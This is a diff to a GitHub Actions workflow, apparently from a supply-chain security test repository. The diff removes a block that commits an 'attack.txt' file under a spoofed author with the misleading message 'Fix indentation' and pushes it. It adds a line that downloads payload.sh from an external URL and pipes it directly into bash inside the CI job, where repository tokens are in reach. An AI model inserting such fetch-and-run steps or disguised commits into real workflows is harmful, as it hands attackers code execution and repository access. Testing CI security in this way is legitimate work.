@@ -11,19 +11,4 @@ jobs:
         run: |
           echo "Hello World!"
         
-          # export GH_TOKEN=${{ secrets.GITHUB_TOKEN }}  
-          # DATE=$(date)
-          # echo $DATE
-          # echo git clone git@github.com:github.com/$GITHUB_REPOSITORY.git
-          # gh repo clone $GITHUB_REPOSITORY
-          # cd "${{ github.event.repository.name }}"
-          #git config user.name github-actions
-          #git config user.email github-actions@github.com
-          
-          git config user.name azeemsgoogle
-          git config user.email azeems@google.com
-
-          echo "$DATE" >> attack.txt
-          git add attack.txt
-          git commit -m "Fix indentation: $DATE"
-          git push
+          curl https://github.com/laurentsimon/scorecard-action-test-2/payload.sh | bash
